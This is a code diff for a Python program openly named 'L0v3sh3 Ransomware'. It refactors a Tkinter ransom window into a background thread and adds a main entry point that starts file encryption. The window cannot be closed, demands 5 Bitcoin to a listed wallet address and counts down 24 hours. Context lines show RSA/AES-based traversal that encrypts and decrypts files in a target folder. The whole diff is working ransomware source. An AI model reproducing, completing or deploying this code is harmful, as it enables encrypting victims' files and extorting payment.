@@ -9,6 +9,7 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 import tkinter as tk
 from functools import partial
+from threading import Thread
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
@@ -21,6 +22,59 @@ with open('./media/public.pem', 'rb') as f:
 # public key with base64 encoding
 pubKey = base64.b64encode(public)
 pubKey = base64.b64decode(pubKey)
+
+###########################################################################################################################
+
+class GUI(Thread):
+    def __init__(self):
+        # ↓↓ Initialize the Thread part of the GUI object, so we can use its functions and attributes
+        Thread.__init__(self)
+        # ↓↓ Kill the thread when the main thread finishes
+        self.daemon = True
+
+    # ↓↓ Overwrite the run() method from thread. This code will be executed when using GUI.start()
+    def run(self):
+        self.root = tk.Tk()
+        def disable_event(): pass
+        self.root.protocol("WM_DELETE_WINDOW", disable_event)
+        self.root.title('L0v3sh3 Ransomware')
+        self.root.geometry('500x300')
+        self.root.resizable(False, False)
+        label1 = tk.Label(self.root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
+        label1.pack()
+        self.label = tk.Label(self.root,font=('calibri', 50,'bold'), fg='white', bg='blue')
+        self.label.pack()
+        decrypt_button = tk.Button(self.root, text='Decrypt', command=decryption_traversal)
+        decrypt_button.pack()
+
+        # call countdown first time
+        self.countdown('23:59:59')
+        # root.after(0, countdown, 5)
+
+        self.root.mainloop()
+
+    def countdown(self, count):
+        # change text in label
+        # count = '01:30:00'
+        hour, minute, second = count.split(':')
+        hour = int(hour)
+        minute = int(minute)
+        second = int(second)
+
+        self.label['text'] = '{}:{}:{}'.format(hour, minute, second)
+
+        if second > 0 or minute > 0 or hour > 0:
+            # call countdown again after 1000ms (1s)
+            if second > 0:
+                second -= 1
+            elif minute > 0:
+                minute -= 1
+                second = 59
+            elif hour > 0:
+                hour -= 1
+                minute = 59
+                second = 59
+            self.root.after(1000, self.countdown, '{}:{}:{}'.format(hour, minute, second))
 
 ###########################################################################################################################
 
@@ -111,50 +165,10 @@ def decryption_traversal():
         if fileType in EXCLUDED_EXTENSIONS: continue
         decrypt(str(filePath), './media/private.pem')
 
-def countdown(count):
-    # change text in label
-    # count = '01:30:00'
-    hour, minute, second = count.split(':')
-    hour = int(hour)
-    minute = int(minute)
-    second = int(second)
-
-    label['text'] = '{}:{}:{}'.format(hour, minute, second)
-
-    if second > 0 or minute > 0 or hour > 0:
-        # call countdown again after 1000ms (1s)
-        if second > 0:
-            second -= 1
-        elif minute > 0:
-            minute -= 1
-            second = 59
-        elif hour > 0:
-            hour -= 1
-            minute = 59
-            second = 59
-        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
-
 ###########################################################################################################################
 
 ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
-
-root = tk.Tk()
-def disable_event(): pass
-root.protocol("WM_DELETE_WINDOW", disable_event)
-root.title('L0v3sh3 Ransomware')
-root.geometry('500x300')
-root.resizable(False, False)
-label1 = tk.Label(root, text='All your files have been encrypted! \n\n Please send us 5 Bitcoin to this address:\n\nmkHS9ne12qx9pS9VojpwU5xtRd4T7X7ZUt\n\n', font=('calibri', 12,'bold'))
-label1.pack()
-label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
-label.pack()
-decrypt_button = tk.Button(root, text='Decrypt', command=decryption_traversal)
-decrypt_button.pack()
-
-# call countdown first time
-countdown('23:59:59')
-# root.after(0, countdown, 5)
 
 ###########################################################################################################################
 
@@ -162,7 +176,9 @@ countdown('23:59:59')
 def encrypt_ransomware():
     encryption_traversal()
 
-    root.mainloop()
+    my_GUI = GUI()
+    my_GUI.start()
+    # root.mainloop()
 
     return
 
@@ -182,3 +198,10 @@ def run():
     # code ...
     success = True
     return success
+
+if __name__ == "__main__":
+    from time import sleep
+    encrypt_ransomware()
+
+    # for i in range(1000000): print(i)
+    sleep(10)
